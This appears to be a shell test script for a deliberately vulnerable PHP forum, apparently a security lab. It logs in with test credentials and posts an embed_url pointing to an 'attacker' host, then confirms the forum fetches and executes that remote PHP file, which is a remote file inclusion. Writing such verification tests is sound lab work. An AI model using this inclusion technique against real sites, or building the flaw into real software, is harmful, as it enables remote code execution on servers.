#!/usr/bin/env bash
set -u
cd "$(dirname "$0")/.." || exit 1
source tests/lib.sh

# probe benigno servido desde el host; el contenedor lo alcanza vía 'attacker' (host-gateway)
python3 -m http.server 9000 --directory tests/fixtures >/dev/null 2>&1 & SRV=$!
trap 'kill $SRV 2>/dev/null' EXIT
sleep 1

J=$(mktemp)
curl -s -c "$J" -b "$J" -d 'username=admin' -d 'password=letmein' "$BASE/foro/login.php" >/dev/null

# Review Focus #2: new_post sin sesión redirige a login
assert_contains "$(curl -s -L "$BASE/foro/new_post.php")" "Iniciar sesión" "new_post exige login"

# crear post con embed_url al probe -> la vista del post incluye y EJECUTA el PHP remoto
loc=$(curl -s -b "$J" -D - -o /dev/null \
  -d 'title=t' -d 'body=b' --data-urlencode 'embed_url=http://attacker:9000/rfi_probe.php' \
  "$BASE/foro/new_post.php" | grep -i '^location:' | tr -d '\r' | awk '{print $2}')
assert_contains "$(curl -s -b "$J" "$BASE/foro/${loc#/foro/}")" "RFI_OK_7f3a" "RFI incluye y ejecuta PHP remoto"

# Review Focus #4: post con embed_url vacío no rompe
loc2=$(curl -s -b "$J" -D - -o /dev/null -d 'title=t2' -d 'body=b2' --data-urlencode 'embed_url=' \
  "$BASE/foro/new_post.php" | grep -i '^location:' | tr -d '\r' | awk '{print $2}')
code=$(curl -s -b "$J" -o /dev/null -w '%{http_code}' "$BASE/foro/${loc2#/foro/}")
[ "$code" = "200" ] || fail "post sin embed_url responde 200"

echo "04_posts_rfi OK"
